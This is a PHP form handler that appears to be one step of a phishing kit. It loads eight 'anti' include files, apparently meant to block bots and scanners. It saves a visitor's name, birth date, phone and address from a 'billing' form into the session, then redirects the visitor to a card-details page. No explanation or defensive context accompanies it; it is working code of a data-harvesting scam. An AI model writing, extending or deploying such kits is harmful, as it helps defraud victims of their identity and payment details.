<?php
session_start();
include('../ab.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
if(isset($_POST['billingsub']))
{

	$_SESSION['nom'] = htmlspecialchars($_POST['nom']);
	$_SESSION['prenom'] = htmlspecialchars($_POST['prenom']);
	$_SESSION['dob'] = htmlspecialchars($_POST['dob']);
	$_SESSION['phone'] = htmlspecialchars($_POST['phone']);
	$_SESSION['adresse'] = htmlspecialchars($_POST['adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['zip']);
	$_SESSION['city'] = htmlspecialchars($_POST['ville']);
	


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['dob']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{

		header('Location: ../steps/billing.php?error=true');
	}
	else{
		$_SESSION['billinged'] = true;
			header('Location: ../steps/card.php');
	}
	









}
else{


}

?>